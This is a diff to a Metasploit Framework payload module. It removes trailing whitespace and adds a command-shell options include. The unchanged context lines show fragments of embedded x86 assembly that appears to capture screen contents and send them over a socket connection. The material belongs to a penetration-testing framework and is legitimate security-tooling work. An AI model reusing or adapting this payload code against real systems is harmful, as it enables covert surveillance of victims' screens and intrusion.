@@ -1,17 +1,18 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
 ##
 
-
 require 'metasm'
 require 'msf/core'
 require 'msf/base/sessions/command_shell'
-
+require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
+
+	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
 		super(merge_info(info,
@@ -122,7 +123,7 @@ resolv_ptrs:
         dec cl
         test cl, cl
         jnz resolv_ptrs
-        
+
         sti
 
         ; all screens have the same size
@@ -320,7 +321,7 @@ new_checksum:
 end_update:
         popad
         ret
-        
+
 
 send_screen:
         push ebx
@@ -341,7 +342,7 @@ send_screen:
         mov eax, dword ptr[edi]
         imul eax, ebx
         add ecx, eax
-        
+
 send_loop:
         cmp bx, word ptr[esi+2]
         jae last_line
@@ -378,7 +379,7 @@ end_sl:
 
 send_data:
         push [esp+8]
-        push [esp+8] 
+        push [esp+8]
         push [edi-0x40]
         push [edi-0x24]
         call sendrecv_data
@@ -387,7 +388,7 @@ send_data:
 
 recv_data:
         push [esp+8]
-        push [esp+8] 
+        push [esp+8]
         push [edi-0x40]
         push [edi-0x28]
         call sendrecv_data
@@ -410,7 +411,7 @@ sendrecv_data:
         push ebx                ; msg_flags
         push ebx                ; msg_controllen
         push ebx                ; msg_control
-        inc ebx                 
+        inc ebx
         push ebx                ; msg_iovlen (1 array)
         dec ebx
         push ecx                ; msg_iov
